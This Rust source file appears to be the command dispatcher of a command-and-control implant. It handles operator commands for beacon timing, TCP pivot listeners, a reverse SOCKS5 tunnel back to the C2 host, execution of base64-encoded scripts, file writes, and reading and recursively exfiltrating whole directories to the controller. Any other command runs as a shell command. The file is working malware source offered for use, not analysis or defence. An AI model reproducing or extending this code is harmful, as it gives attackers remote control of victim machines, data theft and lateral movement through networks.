use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use tokio::net::TcpStream;
use tokio_util::compat::{TokioAsyncReadCompatExt, FuturesAsyncReadCompatExt};
use yamux::Connection;
use futures::StreamExt;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::common::{CommandResponse, SecuredCommand};
use crate::utils;
use crate::file_transfer;
use crate::socks;
use crate::agent::scripting::ExtensionManager;
use crate::agent::pivot::PivotManager;

pub struct HandlerContext {
    pub proxy_handle: Arc<Mutex<Option<tokio::task::AbortHandle>>>,
    pub ext_manager: Arc<Mutex<ExtensionManager>>,
    pub c2_host: String,
    pub tx: mpsc::Sender<Vec<u8>>,
    pub pivot_mgr: Arc<Mutex<PivotManager>>,
}

// [NEW] Enum to handle different types of state changes
pub enum AgentAction {
    UpdateConfig(u64, u32, u32), // Sleep, Min, Max
    SetMode(bool),               // true = Active, false = Passive
    None,
}

pub async fn dispatch(ctx: &HandlerContext, msg: SecuredCommand) -> AgentAction {
    let req_id = msg.counter;
    let cmd = msg.command.as_str();
    
    // Default action
    let mut action = AgentAction::None;

    let (output, error, exit_code) = if cmd.starts_with("sleep ") {
        // Handle standard sleep config update
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.len() >= 4 {
            if let (Ok(s), Ok(min), Ok(max)) = (parts[1].parse::<u64>(), parts[2].parse::<u32>(), parts[3].parse::<u32>()) {
                action = AgentAction::UpdateConfig(s, min, max);
                (format!("Configuration Updated: Sleep {}s, Jitter {}-{}%", s, min, max), String::new(), 0)
            } else {
                (String::new(), "Parse Error".to_string(), 1)
            }
        } else {
            (String::new(), "Usage: sleep <seconds> <min_jitter> <max_jitter>".to_string(), 1)
        }
    } else if cmd == "beacon:mode active" {
        // [NEW] Activate high-frequency mode
        action = AgentAction::SetMode(true);
        ("Beacon Activated (Fast Mode)".to_string(), String::new(), 0)
    } else if cmd == "beacon:mode passive" {
        // [NEW] Deactivate / Return to config
        action = AgentAction::SetMode(false);
        ("Beacon Deactivated (Passive Mode)".to_string(), String::new(), 0)
    } else if cmd.starts_with("pivot:listener_tcp ") {
        let port = cmd.split_whitespace().nth(1).unwrap_or("0").parse::<u16>().unwrap_or(0);
        if port > 0 {
            let res = ctx.pivot_mgr.lock().unwrap().start_agent_listener(port).await;
            (res, String::new(), 0)
        } else {
            (String::new(), "Invalid Port".to_string(), 1)
        }
    } else if cmd.starts_with("proxy:start ") {
        handle_proxy_start(ctx, cmd, req_id).await
    } else if cmd == "proxy:stop" {
        handle_proxy_stop(ctx)
    } else if cmd.starts_with("ext:load ") {
        handle_extension(ctx, cmd)
    } else if cmd.starts_with("file:read_recursive|") {
        handle_recursive_download(ctx, cmd, req_id).await;
        return action;
    } else if cmd.starts_with("file:write|") {
        handle_file_write(cmd)
    } else if cmd.starts_with("file:read|") {
        handle_file_read(cmd)
    } else {
        utils::execute_shell_command(cmd)
    };

    let resp = CommandResponse { request_id: req_id, output, error, exit_code };
    if let Ok(data) = serde_json::to_vec(&resp) {
        let _ = ctx.tx.send(data).await;
    }

    action
}

async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 2 { return (String::new(), "Usage: proxy:start <port>".into(), 1); }
    
    let port = match parts[1].parse::<u16>() {
        Ok(p) => p,
        Err(_) => return (String::new(), "Invalid Port".into(), 1),
    };

    if let Some(handle) = ctx.proxy_handle.lock().unwrap().take() {
        handle.abort();
    }

    let host = ctx.c2_host.clone();
    let handle = tokio::spawn(async move {
        let addr = format!("{}:{}", host, port);
        if let Ok(stream) = TcpStream::connect(&addr).await {
            let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
            let connection = Connection::new(stream, yamux::Config::default(), yamux::Mode::Client);
            yamux::into_stream(connection).for_each_concurrent(None, |s| async move {
                if let Ok(yamux_stream) = s {
                    let mut tokio_stream = FuturesAsyncReadCompatExt::compat(yamux_stream);
                    let _ = socks::handle_socks5_stream(&mut tokio_stream).await;
                }
            }).await;
        }
    });

    *ctx.proxy_handle.lock().unwrap() = Some(handle.abort_handle());
    (format!("Proxy Tunnel Started on Port {}", port), String::new(), 0)
}

fn handle_proxy_stop(ctx: &HandlerContext) -> (String, String, i32) {
    if let Some(handle) = ctx.proxy_handle.lock().unwrap().take() {
        handle.abort();
        ("Proxy Stopped".into(), String::new(), 0)
    } else {
        ("No proxy running".into(), String::new(), 1)
    }
}

fn handle_extension(ctx: &HandlerContext, cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() < 2 { return (String::new(), "Invalid extension format".into(), 1); }

    let b64_str = parts[1];
    let script_args: Vec<String> = parts.iter().skip(2).map(|s| s.to_string()).collect();

    match BASE64.decode(b64_str) {
        Ok(bytes) => match String::from_utf8(bytes) {
            Ok(script) => {
                let mut manager = ctx.ext_manager.lock().unwrap();
                let result = manager.run_script(&script, script_args);
                (result, String::new(), 0)
            },
            Err(_) => (String::new(), "UTF8 Error".into(), 1),
        },
        Err(_) => (String::new(), "Base64 Error".into(), 1),
    }
}

async fn handle_recursive_download(ctx: &HandlerContext, cmd: &str, req_id: u64) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() != 2 { return; }
    
    let root_path = parts[1].to_string();
    let tx = ctx.tx.clone();
    
    tokio::spawn(async move {
        let files = file_transfer::find_all_files(&root_path);
        let batch_ts = chrono::Utc::now().format("%Y%d%m_%H%M%S_%3f").to_string();
        let root_name = std::path::Path::new(&root_path).file_name().unwrap_or_default().to_string_lossy().to_string();
        
        let mut report = file_transfer::RecursiveReport { 
            root_path: root_path.clone(), total_files_found: files.len(), total_success: 0, failed_downloads: Vec::new() 
        };

        for path in files {
            let path_str = path.to_string_lossy().to_string();
            let rel_path = path_str.clone(); 

            match file_transfer::read_file_to_b64(&path_str) {
                Ok((b64, perms)) => {
                    let output = format!("file:data_batch|{}|{}|{}|{}|{}", batch_ts, root_name, rel_path, perms, b64);
                    let resp = CommandResponse { request_id: req_id, output, error: String::new(), exit_code: 0 };
                    if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
                    report.total_success += 1;
                    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
                },
                Err(e) => report.failed_downloads.push((path_str, e)),
            }
        }
        
        let rep_json = serde_json::to_string(&report).unwrap_or_default();
        let final_out = format!("file:report_batch|{}|{}|{}", batch_ts, root_name, rep_json);
        let resp = CommandResponse { request_id: req_id, output: final_out, error: String::new(), exit_code: 0 };
        if let Ok(j) = serde_json::to_vec(&resp) { let _ = tx.send(j).await; }
    });
}

fn handle_file_write(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(3, '|').collect();
    if parts.len() == 3 {
        match file_transfer::write_file_simple(parts[1], parts[2]) {
            Ok(_) => (format!("File written: {}", parts[1]), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), "Upload error".into(), 1) }
}

fn handle_file_read(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(2, '|').collect();
    if parts.len() == 2 {
        match file_transfer::read_file_to_b64(parts[1]) {
            Ok((b64, perms)) => (format!("file:data|{}|{}|{}", parts[1], perms, b64), String::new(), 0),
            Err(e) => (String::new(), e, 1),
        }
    } else { (String::new(), "Read error".into(), 1) }
}
